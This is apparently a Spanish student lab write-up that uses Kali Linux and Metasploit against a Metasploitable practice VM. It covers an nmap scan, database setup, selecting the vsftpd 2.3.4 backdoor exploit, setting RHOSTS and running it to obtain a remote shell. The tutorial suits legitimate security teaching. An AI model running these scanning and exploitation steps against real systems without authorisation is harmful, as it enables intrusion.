#  TAREA 3 - Metaesploit

### ÍNDICE

1. [Primeros pasos](#primeros-pasos)


## Primeros pasos

Para realizar esta práctica, tendremos que tener instalada una máquina con el SO `Kali Linux` y **un equipo donde podamos realizar varios esploits**.

Dentro de nuestra máquina **Kali Linux**, analizaremos la red para ver que equipos vulnerables encontramos (tanto Kali como el equipo vulnerable, vamos a dar por hecho que están en la misma red).

Una vez identificada la **IP de Metasploitable**, realizamos un escaneo más completo para conocer qué servicios ofrece.

```sh
nmap -sS -sV -O ip_objetivo
```

![alt image](./IMG/captura1-1.png)

En nuestro caso, metasploit utiliza una base de datos PostgreSQL. Vamos a comprobar si está activo:

```sh
service postgresql status
```

Si no está activo...

```sh
service postgresql start

```

![alt image](./IMG/captura1-2.png)

Ahora a continuación vamos a ejecutar estos tres comandos:

```sh
msfdb
msfdb init
msfdb status
```

- `msfdb` *Herramienta para gestionar la base de datos de Metasploit.*
- `init` *Inicializa la base de datos.*
- `status` *Comprueba que la base de datos está activa y funcionando correctamente.*

![alt image](./IMG/captura1-3.png)

![alt image](./IMG/captura1-4.png)

![alt image](./IMG/captura1-5.png)

Una vez configurada la base de datos, accedemos a Metasploit:

```sh
msfconsole
```

![alt image](./IMG/captura1-6.png)

Buscamos exploits y módulos en la base de datos.

```sh
search vulnerabilidad version

```

![alt image](./IMG/captura1-7.png)

También podemos seleccionar un exploit directamente usando su ruta completa.

En este caso, para FTP:

```sh
use exploit/unix/ftp/vsftpd_234_backdoor

```

![alt image](./IMG/captura1-8.png)

El siguiente comando muestra.
- Descripción del exploit
- Autor
- Sistema afectado
- Referencias

```sh
show info
```

![alt image](./IMG/captura1-9.png)

Con este comando, veremos parámetros como:

- `RHOSTS` IP del objetivo
- `RPORT` puerto del servicio

```sh
show options
```

![alt image](./IMG/captura1-10.png)

Indicamos la IP de la máquina Metasploitable:

```sh
set RHOSTS 1ip_objetivo
```

Para comprobar que se ha configurado correctamente:

```sh
show options
```

![alt image](./IMG/captura1-11.png)

Finalmente ejecutamos el ataque con:

```sh
exploit
```

o

```sh
run
```

Si la vulnerabilidad existe, Metasploit nos dará acceso a una shell remota.

![alt image](./IMG/captura1-12.png)